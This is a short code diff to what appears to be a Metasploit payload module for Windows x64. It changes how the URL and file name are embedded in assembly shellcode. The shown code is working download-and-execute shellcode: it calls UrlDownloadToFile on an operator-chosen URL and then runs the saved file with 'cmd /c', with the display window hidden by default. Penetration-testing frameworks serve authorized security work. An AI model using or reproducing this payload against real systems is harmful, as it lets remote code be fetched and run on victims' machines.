@@ -42,8 +42,8 @@ module MetasploitModule
     display = datastore['DISPLAY'] || 'HIDE'
     url_length = url.bytesize
     file_length = file.bytesize
-    url = Rex::Text.to_hex_cstring(url, nullbyte: false)
-    file = Rex::Text.to_hex_cstring(file, nullbyte: false)
+    url = Metasm::Shellcode.define_data(url)
+    file = Metasm::Shellcode.define_data(file)
 
     payload = %^
             cld
@@ -65,13 +65,15 @@ module MetasploitModule
 
         SetUrl:
             call SetFile
-            db #{url}, 0x41
+            #{url}
+            db 0x41
 
         SetFile:
             pop rdx ; 2nd argument
             xor byte [rdx+#{url_length}], 'A' ; null terminator
             call UrlDownloadToFile
-            db #{file}, 0x43
+            #{file}
+            db 0x43
 
         UrlDownloadToFile:
             pop r8 ; 3rd argument
@@ -85,7 +87,9 @@ module MetasploitModule
 
         SetCommand:
             call Exec
-            db "cmd /c ", #{file}, 0x46
+            db "cmd /c "
+            #{file}
+            db 0x46
 
         Exec:
             pop rcx ; 1st argument
